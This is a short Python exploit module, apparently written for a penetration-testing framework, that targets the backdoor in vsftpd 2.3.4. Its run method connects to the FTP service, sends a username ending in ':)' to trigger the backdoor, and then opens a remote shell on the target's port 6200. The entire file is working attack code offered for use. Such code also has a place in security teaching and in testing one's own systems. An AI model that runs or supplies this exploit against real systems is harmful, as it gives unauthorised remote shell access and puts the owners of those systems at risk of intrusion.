# coding:UTF-8
# Python 3.10.6
# Date: 2025-7-23
# By Super hat

from resources import shell
import socket
from resources.font import print_error, print_success, print_info
from resources.base_module import BaseExploit

class Exploit(BaseExploit):
    def __init__(self, host=None, port=21):
        super().__init__(host, port)
        self.info = {
            "Author": "Super hat",
            "Date": "2025-7-23",
            "Platform": "Linux",
            "Software and version": "vsftpd 2.3.4",
            "Description": "Vsftpd2.3.4 Smiling Face Vulnerability Exploiting Module"
        }

    def run(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print_info("Target:{}:{}".format(self.host, self.port))
            sock.connect((self.host, int(self.port)))
            print_success("Successfully connected to the target host")
            sock.send(b"USER aaa:)\r\n")
            sock.send(b"PASS aaa:)\r\n")
            print_success("Successfully sent login credentials")
            shell.open(self.host, 6200)
            sock.close()
        except BaseException as e:
            print_error(e)

    def set(self, arg, value):
        super().set(arg, value)

    def show_info(self):
        super().show_info()

    def options(self):
        super().options()
